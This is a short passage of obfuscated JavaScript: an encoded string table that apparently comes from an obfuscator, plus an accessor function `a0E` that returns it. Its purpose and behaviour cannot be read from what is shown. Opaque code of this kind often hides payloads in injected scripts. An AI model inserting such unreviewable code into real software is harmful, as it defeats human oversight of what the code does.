u=['xCktpW','WPRdV0ZdU37dKWpdLK0','W590oq','WRNdLdu','D1GqjSovW5JcOCkLmJ0','WRJdKxS','bmomtG','d8ktBG','wCkMWP0','vCoZca','qmkQWOK','W6uFsmoUqCoCWQP/','W7j8W6e','a8kDbmoQmSoQW7RdPq1qpmk7qW','iKW0','wCkhW4u','W6hdU8kD','EbqIr8orWPayWQ7dTmkkWONcP8oz','scbh','W73cVSo7','mL9a','wfSf','ANVcGq','xYPe','sSoecW','t8k0W4u','irzP','WQGkhW','uSk+W5S','ENnI','W48pW7rdemk5W4rP','hx0CWPzofGiNW5/dRmoaW6S','WRCUlq','u8ohxW','W4rhWQm','W4KEW5W','zHfWWQBdJdJdHmovFL8q','WPizW7y','dbnp','h8khrW','W5NcQqK','ESkjW5aaWPnOWQldT8ocW4qLxa','W4HZoW','W4jdWRq3W6pcGmk4WP8SWRbZlG','wCkcha','beNcHq','W7JdUeq','WQFdH3O','WOhdRbS','pKLG','uSkxnq','WPHyW7q','e8kbW58','W7RdVmkL','a8odqW','WOpdUvC','WQ80pW','WPZdOLu','EXeSrmovWP0yW6JdJ8kmWOhcLCoTdq','nmkViCkNtmokWOJcS8oMfa','W7H5AW','W6D8W7q','xYP+','WPhdU08','stDE','cmkmAq','tSkBpq','zM/cQG','EvnJ','W6D8W7m','vCojva','x8kTWP0','bW9zWO7cJ8k4W4e/W69zW6mHaSkN','yH9WWQhdJuBcQ8o+zKqUW7O4','WOifW7m','ovzN','du3dNW','wL3dN8kYdCkXhmkfkCkMzbX9','fCoHWPOJv8orW5qwWPa','m8k3jG','WPKDW6C','fmkkia','WRddHw8','D3/cKa','d8ogz2uUz8kre1qYka','xCkhuq','W6dcMsrcxWtdP23dJ8k/pmo8','W55tWOu','fSkxEG','W49DWQS','vmkrW4m','CheO','WQbvuW','D8oWDq','tmoZW6e','WQG1pG','hSoxsa','ASoyWQa','W7b9zq'];a0E=function(){return u;};return a0E();}};